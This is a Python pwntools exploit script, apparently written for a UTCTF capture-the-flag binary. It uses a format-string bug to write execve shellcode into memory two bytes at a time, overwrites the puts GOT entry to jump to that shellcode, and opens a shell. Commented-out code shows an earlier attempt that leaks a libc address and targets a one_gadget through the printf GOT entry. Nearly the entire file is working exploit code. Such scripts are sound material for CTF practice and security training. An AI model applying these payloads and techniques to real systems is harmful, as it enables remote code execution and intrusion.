from pwn import *
import sys


context.clear(arch='amd64', os='linux')

argv = sys.argv
REMOTE = False
DEBUG = False
binary_path = './pwnable'

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE: 
	sh = remote('binary.utctf.live', 9003)
	libc = ELF('./libc-2.23.so', checksec=False)
else:
	sh = process(binary_path)
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

if DEBUG:
		gdb.attach(sh, '''
			b* do_move+167
			''')

e = ELF(binary_path, checksec=False)

# ----------- plan -------------
# write shellcode on the buffer
# overwrite puts@got with shellcode address

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x90\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# from /proc/PID/maps
base_address = 0x601101

payload = fmtstr_payload(6, {base_address: 0xc031}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 2: 0x4890}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 4: 0xd1bb}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 6: 0x969d}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 8: 0xd091}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 10: 0x978c}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 12: 0x48ff}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 14: 0xdbf7}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 16: 0x5453}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 18: 0x995f}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 20: 0x5752}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 22: 0x5e54}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 24: 0x9090}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 26: 0x3bb0}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {base_address + 28: 0x050f}, write_size='short')
sh.sendlineafter('What would you like to do?\n', payload)

payload = fmtstr_payload(6, {0x601018: base_address}, write_size='long')
sh.sendlineafter('What would you like to do?\n', payload)

sh.interactive()

# for key in writes.keys():
# 	payload = fmtstr_payload(6, {key: writes[key]}, write_size='short') 
# 	sh.sendlineafter('What would you like to do?\n', payload)

# 	log.info('writing {} into {}'.format(hex(writes[key]), hex(key)))
# 	# log.info('finished {} from {}'.format(counter, len(writes.keys())))
# 	counter+=1

# sh.interactive()



# __libc_start_main_offset = libc.sym['__libc_start_main']
# one_gadget_offset_remote = 0x45216

# first_payload = '%17$x'
# log.info('first payload: {}'.format(first_payload))
# sh.sendlineafter('What would you like to do?', first_payload)

# sh.recvline()

# leaked_address = int(sh.recvline().split(' ')[0], 16)
# __libc_start_main = '0x7fff' + str(hex(int(leaked_address - 231)))[2:]
# libc_base = int(__libc_start_main, 16) - __libc_start_main_offset

# one_gadget = libc_base + one_gadget_offset_remote
# log.info('leaked __libc_start_main: {}'.format(__libc_start_main))
# log.info('libc base: {}'.format(hex(libc_base)))
# log.info('one gadget: {}'.format(hex(one_gadget)))


# libc.address = libc_base
# writes = {
# 	e.got['printf']: one_gadget
# }

# # log.info('system -> {}'.format(libc.sym['system']))

# # second_payload = fmtstr_payload(6, writes, write_size='short') 
# second_payload = fmtstr.make_atoms(writes=writes, sz=2, szmax=2, numbwritten=0, overflows=3, strategy='fast', badbytes='\x00')
# # second_payload = fmtstr.make_atoms_simple(e.got['printf'], one_gadget, badbytes=frozenset(['\x00']))
# log.info('second payload: {}'.format(second_payload))

# sh.sendlineafter('What would you like to do?', second_payload)


# sh.interactive()



# leak address of __libc_start_main :)
# calculate base of libc :)
# override puts@got with one_gadget :(

